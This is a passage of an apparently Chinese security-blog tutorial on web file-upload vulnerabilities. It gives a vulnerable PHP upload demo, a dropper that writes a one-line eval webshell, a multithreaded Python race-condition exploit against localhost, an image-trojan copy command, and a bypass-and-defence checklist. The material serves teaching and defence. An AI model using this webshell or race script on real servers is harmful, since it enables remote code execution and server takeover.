+<h2 id="5-竞争上传"><a href="#5-竞争上传" class="headerlink" title="5. 竞争上传"></a>5. 竞争上传</h2><p>演示代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./"</span>;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+<p>经过几次尝试后成功成功写入shell<br><img src="http://ofrdce5qv.bkt.clouddn.com/16.png" alt=""></p>
+<h2 id="6-图片木马制作"><a href="#6-图片木马制作" class="headerlink" title="6. 图片木马制作"></a>6. 图片木马制作</h2><p><strong>命令：</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">copy</span><span class="bash"> /b 1.jpg+2.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">条件： 寻找一个上传点，查看上传点是否可用。</span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line"></span><br><span class="line">首先判断是程序员自己写的上传点，还是编辑器的上传功能</span><br><span class="line"></span><br><span class="line">如果是编辑器上传功能，goolge当前编辑器的漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果是程序员写的上传点</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片 查看上传点是否可用</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截， <span class="number">00</span>截断 <span class="number">1.</span>php%<span class="number">00.</span>jpg</span><br><span class="line"></span><br><span class="line">判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</span><br><span class="line"></span><br><span class="line">利用解析漏洞</span><br><span class="line"></span><br><span class="line">防御：：：</span><br><span class="line"></span><br><span class="line">上传文件的存储目录禁用执行权限</span><br><span class="line"></span><br><span class="line">文件后缀白名单，注意<span class="number">0x00</span>截断攻击（PHP更新到最新版本）</span><br><span class="line"></span><br><span class="line">不能有本地文件包含漏洞</span><br><span class="line"></span><br><span class="line">及时修复Web上传代码（重要）</span><br><span class="line"></span><br><span class="line">升级Web Server</span><br></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="Upload Attack Framework">1. Upload Attack Framework</a></p>
+<p><a href="http://www.yyipu.com/index.php/2017/04/26/49.html" target="_blank" rel="noopener">2. web中的条件竞争漏洞</a></p>
+<p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">3. 文件上传总结</a></p>
+<p><a href="http://www.joychou.org/index.php/web/truncated.html" target="_blank" rel="noopener">4. 截断在文件包含和上传中的利用</a></p>
+<p><a href="http://www.jianshu.com/p/eba198dd30ef" target="_blank" rel="noopener">5. 文件上传漏洞</a></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/10/wooyun-1000php-16/" title= mvmmall网店商城系统注入漏洞-2011.07 >
+                    <span>往后一页</span>
+                    <span>mvmmall网店商城系统注入漏洞-2011.07</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMjI3OC84ODQy>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
+    
+
+
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-概述"><span class="toc-number">1.</span> <span class="toc-text">1. 概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-上传检测流程"><span class="toc-number">2.</span> <span class="toc-text">2. 上传检测流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-客户端校验"><span class="toc-number">3.</span> <span class="toc-text">3. 客户端校验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-服务端检测"><span class="toc-number">4.</span> <span class="toc-text">4. 服务端检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-服务端MIME类型检测"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 服务端MIME类型检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-服务端目录路径检测"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. 服务端目录路径检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-服务端文件扩展名检测"><span class="toc-number">4.3.</span> <span class="toc-text">4.3. 服务端文件扩展名检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-服务端文件内容检测"><span class="toc-number">4.4.</span> <span class="toc-text">4.4. 服务端文件内容检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-竞争上传"><span class="toc-number">5.</span> <span class="toc-text">5. 竞争上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-图片木马制作"><span class="toc-number">6.</span> <span class="toc-text">6. 图片木马制作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-总结"><span class="toc-number">7.</span> <span class="toc-text">7. 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive" >目前才写: 19 篇博文，好好努力吧，骚年。 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href= "/2017/12/11/file-upload/" >WEB文件上传漏洞总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-16/" >mvmmall网店商城系统注入漏洞-2011.07</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-15/" >fckeditor2.6.4 任意文件上传漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/2017/12/10/wooyun-1000php-14/" >PHPCMS V9 通行证注册缺陷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-8/" >phpcms2008本地文件包括及利用（执行任意SQL脚本）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-11/" >Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-9/" >PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-10/" >HZCMS 合正网站群内容管理系统SQL注射漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-12/" >游戏风云cms存在SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-13/" >dedecms v5.3-v5.6 Get Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-7/" >phpwind远程代码执行漏洞-2010.09</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-6/" >phpcms 2008 sp4 爆路径及任意文件删除漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-5/" >PHPCMS通杀XSS-2010.08</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2017/12/08/wooyun-1000php-4/" >Discuz!漫游插件API本地包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-3/" >ecshop SQL注射漏洞-2010.8.21</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-2/" >Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2017/12/07/wooyun-1000php-1/" >BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2017/11/26/hxctf2017-writeup/" >hxctf2017-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2017/11/24/blog/" >My blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name"><a href= "#">小试牛刀</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">web渗透-文件上传</a></span>
+    
+        <span class="sidebar-tag-name"><a href= "#">wooyun-1000php</a></span>
+    
+    </div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #888; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tag-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var jsInfo = {
+        root: '/'
+    }
+</script>
+    <!-- 不蒜子  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ统计  -->
+    
+    </div>
+    </body>
+</html>
+
+
